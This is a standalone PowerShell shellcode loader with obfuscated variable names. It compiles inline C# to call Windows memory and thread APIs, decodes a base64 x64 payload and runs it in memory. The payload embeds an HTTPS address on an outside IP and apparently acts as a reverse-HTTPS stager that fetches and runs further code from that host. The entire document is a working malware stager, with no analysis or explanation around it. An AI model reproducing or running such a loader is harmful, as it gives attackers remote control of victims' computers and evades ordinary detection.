Set-StrictMode -Version 2
$xubDG = @"
        using System;
        using System.Runtime.InteropServices;
        namespace iogd {
                public class func {
                        [Flags] public enum AllocationType { Commit = 0x1000, Reserve = 0x2000 }
                        [Flags] public enum MemoryProtection { ReadWrite = 0x04, Execute= 0x10 }
                        [Flags] public enum Time : uint { Infinite = 0xFFFFFFFF }
                        [DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
                        [DllImport("kernel32.dll")] public static extern bool VirtualProtect(IntPtr lpAddress, int dwSize, int flNewProtect,out int lpflOldProtect);
                        [DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
                        [DllImport("kernel32.dll")] public static extern int WaitForSingleObject(IntPtr hHandle, Time dwMilliseconds);
                }
        }
"@

$aXQe = New-Object Microsoft.CSharp.CSharpCodeProvider
$om = New-Object System.CodeDom.Compiler.CompilerParameters
$om.ReferencedAssemblies.AddRange(@("System.dll", [PsObject].Assembly.Location))
$om.GenerateInMemory = $True
$ho = $aXQe.CompileAssemblyFromSource($om, $xubDG)

[Byte[]]$fS = [System.Convert]::FromBase64String("/EiD5PDozAAAAEFRQVBSSDHSUVZlSItSYEiLUhhIi1IgSA+3SkpNMclIi3JQSDHArDxhfAIsIEHByQ1BAcHi7VJIi1IgQVGLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0ItIGFBEi0AgSQHQ41ZI/8lNMclBizSISAHWSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11IMdtTSb53aW5odHRwAEFWSInhScfCTHcmB//VU0m+Y3J5cHQzMgBBVkiJ4UnHwkx3Jgf/1VNTSInhU1pNMcBNMclTU0m6BB+duwAAAAD/1UmJxOgeAAAANQAxAC4AMQAyADQALgAxADgAOAAuADEAOAAxAAAAWkiJwUnHwLsBAABNMclJukabHsIAAAAA/9XoBAIAAGgAdAB0AHAAcwA6AC8ALwA1ADEALgAxADIANAAuADEAOAA4AC4AMQA4ADEALwAyAGQAMgBZAFIALQB0AEEAWABuADQATwBOAFEAOAAzAGIAYQBUAHIALQBBAHMATQBiAEgAMABnADcAMQAwAEEARABTAHMARQBCADIALQBqAGwAZwA3AFEAdQA4AF8AbABEAE8AUQBrAC0AMQBKADQAVAAwADEATwB3AHoAMQBTAEkALQBtAGcAcABaAHcATQBjAGEAUQBWAGEATQBCADIAdgBOAHYANgBRAE4ARwBEAFYAQwA3AGkAMwB0AHQASwBNAEIAYQBTAHIAMQBZAFQARABEAE0AdwBIAE8ANwBpAFQAYQA0AEEAZgAyAEsAQQB0AG4AZgBuAGkAegBKAGgAdQAzAHMAQwAzAGsAbQBUAGIAdgBpAGkAbABVAE8AbABsAHgAbQBEADMAagAyAHkAUgBCAFoAMwBjAGQAeABUAEkAOABEAFQAegB1AEgAbwAxAHkAbAByAE8AUABJAHEAMAB0AHAAMQBSAEQANABsAEsAQgBMAGwASgBGAGgAYgBmADQAbQBSAC0AMQB4ADQAcwBVAHAAUABBAEIAbQBOAG8AUABjAFgAVwBKAEkANABxAHUAQQBNADYARgBoAG8ASABSAE4AdgA3ADIAZABhAEwANwAAAEiJwVNaQVhNicVJg8AsTTHJU0jHwAABgABQU1NJx8KYELNb/9VIicZIg+ggSInnSIn5ScfCIacLYP/VhcAPhG0AAABIi0cIhcB0OkiJ2Uj/wUjB4SBRU1BIuAMAAAADAAAAUEmJ4EiD7CBIiedJiflMieFMiepJx8La3epJ/9WFwHQt6xJIi0cQhcB0I0iDxwhqA1hIiQdJifhqGEFZSInxaiZaSbrTWJ3OAAAAAP/VagpfSInxah9aUmgAMwAASYngagRBWUm601idzgAAAAD/1U0xwFNaSInxTTHJU1NTU0m6lVi7kQAAAAD/1YXAdQxI/890Auu76N4AAABIifFTWknHwgWInXD/1YXAdOlIifFqTlpJieBNicZTaghJieFJx8J4BC8n/9WFwHTKSYsOahhJieFJiedJKyFJieBNicZqA1pJui1uqcMAAAAA/9WFwA+En////+gUAAAA0iwktRicANmMUcAhMOWyRwgqn+9YSJZMifdJiw/zpg+Fdf///0iWU1lqQFpJidHB4hBJx8AAEAAASbpYpFPlAAAAAP/VSJNTU0iJ50iJ8UiJ2knHwAAgAABJiflJx8JsKSR+/9VIg8QghcAPhCn///9miwdIAcOFwHXRWMNYagBZScfC8LWiVv/V")
[Uint32]$uL = 0

$fKNA = [iogd.func]::VirtualAlloc(0, $fS.Length + 1, [iogd.func+AllocationType]::Reserve -bOr [iogd.func+AllocationType]::Commit, [iogd.func+MemoryProtection]::ReadWrite)
if ([Bool]!$fKNA) { $global:result = 3; return }
[System.Runtime.InteropServices.Marshal]::Copy($fS, 0, $fKNA, $fS.Length)

if ([iogd.func]::VirtualProtect($fKNA,[Uint32]$fS.Length + 1, [iogd.func+MemoryProtection]::Execute, [Ref]$uL) -eq $true ) {
        [IntPtr] $yFOn6 = [iogd.func]::CreateThread(0,0,$fKNA,0,0,0)
        if ([Bool]!$yFOn6) { $global:result = 7; return }
        $i9v6 = [iogd.func]::WaitForSingleObject($yFOn6, [iogd.func+Time]::Infinite)
}
